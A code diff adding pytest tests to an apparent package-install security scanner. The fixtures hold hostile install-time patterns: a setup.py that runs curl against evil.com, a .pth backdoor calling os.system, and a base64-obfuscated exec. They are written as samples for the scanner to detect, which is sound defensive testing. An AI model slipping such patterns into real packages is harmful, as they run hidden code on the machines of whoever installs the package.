@@ -1,4 +1,7 @@
-from vibefort.interceptor import parse_install_args
+from vibefort.interceptor import (
+    parse_install_args, run_intercept, get_registry,
+    ALLOWED_MANAGERS, _scan_local_path,
+)
 
 
 # --- pip ---
@@ -145,3 +148,61 @@ def test_parse_install_args_pdm_add():
 def test_parse_install_args_pdm_non_add():
     packages = parse_install_args(["install"], manager="pdm")
     assert packages == []
+
+
+# --- get_registry ---
+
+def test_get_registry_pip():
+    assert get_registry("pip") == "pip"
+
+def test_get_registry_npm():
+    assert get_registry("npm") == "npm"
+
+def test_get_registry_yarn():
+    assert get_registry("yarn") == "npm"
+
+def test_get_registry_poetry():
+    assert get_registry("poetry") == "pip"
+
+def test_get_registry_unknown():
+    assert get_registry("unknown") == "pip"
+
+
+# --- ALLOWED_MANAGERS ---
+
+def test_allowed_managers_contains_all():
+    expected = {"pip", "uv", "pipx", "poetry", "pdm", "npm", "npx", "yarn", "pnpm", "bun", "bunx"}
+    assert expected == set(ALLOWED_MANAGERS)
+
+
+# --- run_intercept rejects unknown managers ---
+
+def test_run_intercept_rejects_unknown_manager(capsys):
+    exit_code = run_intercept("evil_binary", ["install", "something"])
+    assert exit_code == 1
+    captured = capsys.readouterr()
+    assert "unknown" in captured.err.lower()
+
+
+# --- _scan_local_path ---
+
+def test_scan_local_path_clean(tmp_path):
+    (tmp_path / "setup.py").write_text('from setuptools import setup\nsetup(name="clean")\n')
+    result = _scan_local_path(tmp_path)
+    assert result.safe is True
+
+def test_scan_local_path_malicious(tmp_path):
+    (tmp_path / "setup.py").write_text('import subprocess\nsubprocess.call(["curl", "http://evil.com"])\n')
+    result = _scan_local_path(tmp_path)
+    assert result.safe is False
+    assert result.evidence  # Should have evidence lines
+
+def test_scan_local_path_pth_backdoor(tmp_path):
+    (tmp_path / "evil.pth").write_text('import os; os.system("bad")')
+    result = _scan_local_path(tmp_path)
+    assert result.safe is False
+
+def test_scan_local_path_obfuscated(tmp_path):
+    (tmp_path / "payload.py").write_text('import base64; exec(base64.b64decode("aW1wb3J0IG9z"))')
+    result = _scan_local_path(tmp_path)
+    assert result.safe is False
